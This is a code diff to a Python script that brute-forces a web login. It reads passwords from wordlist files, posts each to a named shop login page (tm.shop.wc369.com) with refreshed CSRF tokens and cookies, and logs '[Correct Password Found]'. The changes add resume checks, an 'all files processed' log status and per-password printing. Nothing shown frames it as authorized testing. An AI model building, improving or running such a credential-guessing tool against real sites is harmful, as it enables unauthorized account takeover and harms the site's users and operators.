@@ -62,7 +62,7 @@ def send_post_request(password, line_no, csrf_token, cookie):
         print(response.text)
         return 1
 
-    # print(f"Password: {password} Posted.")
+    print(f"Password: {password} Posted.")
     # print(response.text)
     return 2
 
@@ -73,7 +73,11 @@ def process_password_files_in_directory(directory):
         current_data.current_file_path = queue_file_path[0]
         file_index = queue_file_path.index(current_data.current_file_path)
     else:
-        file_index = queue_file_path.index([current_data.current_file_path])
+        if [current_data.current_file_path] in queue_file_path:
+            file_index = queue_file_path.index([current_data.current_file_path])
+        else:
+            log_password_entry(2)
+            sys.exit(0)
 
     index = 0
 
@@ -101,6 +105,7 @@ def process_password_files_in_directory(directory):
                     sys.exit(0)
                 elif post_status == 2:
                     continue
+    log_password_entry(2)
 
 def get_new_csrf_token_and_cookie():
     login_url = 'http://tm.shop.wc369.com/login'
@@ -125,6 +130,9 @@ def log_password_entry(status):
         print("Ctrl+C suspended and log recorded.")
     elif status == 0:
         log_entry = '[Correct Password Found] ' + log_entry
+    elif status == 2:
+        log_entry = '[All File Processed] ' + log_entry
+        print("All files have been processed or log is incorrect. Log recorded.")
     else:
         log_entry = '[Process Exception Suspended] ' + log_entry
 
